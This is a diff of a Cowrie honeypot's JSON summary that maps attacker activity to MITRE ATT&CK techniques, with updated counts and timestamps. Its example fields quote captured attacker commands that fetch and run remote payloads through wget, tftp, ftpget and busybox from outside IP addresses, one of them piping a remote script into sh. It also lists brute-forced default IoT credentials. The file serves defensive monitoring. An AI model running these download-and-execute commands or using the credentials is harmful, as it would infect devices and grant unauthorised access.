@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-17 01:01:11",
+  "generated": "2026-08-17 02:03:45",
   "totals": {
-    "commands": 1886,
-    "login_failed": 2007,
-    "login_success": 622,
-    "sessions": 1722
+    "commands": 2389,
+    "login_failed": 2572,
+    "login_success": 777,
+    "sessions": 2100
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2007,
+      "count": 2572,
       "examples": [
         "user / user",
         "root / juantech",
@@ -21,14 +21,14 @@
         "root / 54321"
       ],
       "first": "2026-08-17T00:00:02.095344Z",
-      "last": "2026-08-17T01:01:04.369362Z",
-      "unique_ips": 16
+      "last": "2026-08-17T02:03:43.602353Z",
+      "unique_ips": 20
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 622,
+      "count": 777,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "admin / 7ujMko0admin",
@@ -37,14 +37,14 @@
         "hikvision / hikvision"
       ],
       "first": "2026-08-17T00:00:02.486601Z",
-      "last": "2026-08-17T01:01:03.714825Z",
-      "unique_ips": 9
+      "last": "2026-08-17T02:03:42.565158Z",
+      "unique_ips": 12
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 15,
+      "count": 31,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,23 +53,24 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-17T00:12:41.686965Z",
-      "last": "2026-08-17T00:13:19.596196Z",
-      "unique_ips": 1
+      "last": "2026-08-17T01:54:31.823547Z",
+      "unique_ips": 3
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 4,
+      "count": 9,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh "
       ],
       "first": "2026-08-17T00:12:43.326791Z",
-      "last": "2026-08-17T00:13:19.596196Z",
-      "unique_ips": 1
+      "last": "2026-08-17T01:54:31.823547Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
@@ -88,59 +89,59 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-17T00:12:43.326791Z",
-      "last": "2026-08-17T00:12:43.326791Z",
-      "unique_ips": 1
+      "last": "2026-08-17T01:53:25.438152Z",
+      "unique_ips": 2
     }
   ],
   "unmapped": [
     [
       "system",
-      616
+      771
     ],
     [
       "shell",
-      616
+      771
     ],
     [
       "sh",
-      616
+      771
     ],
     [
       "/bin/busybox",
-      7
+      14
     ],
     [
       "enable",
-      2
+      6
     ],
     [
       "linuxshell",
-      2
+      4
     ],
     [
       "/bin/busybox UNSTABLE",
-      1
+      2
     ],
     [
       "enablelinuxshell",
-      1
+      2
     ],
     [
       "ping ;sh",
-      1
+      2
     ],
     [
       "busybox",
-      1
+      2
     ],
     [
       "cd /proc && cat self/cmdline",
-      1
+      2
     ],
     [
       "echo SHELL_TEST",
@@ -156,6 +157,22 @@
     ],
     [
       "./",
+      1
+    ],
+    [
+      "cat /proc/mounts; /bin/busybox XZZSZ",
+      1
+    ],
+    [
+      "ping; sh",
+      1
+    ],
+    [
+      "/bin/busybox STC",
+      1
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
       1
     ]
   ]
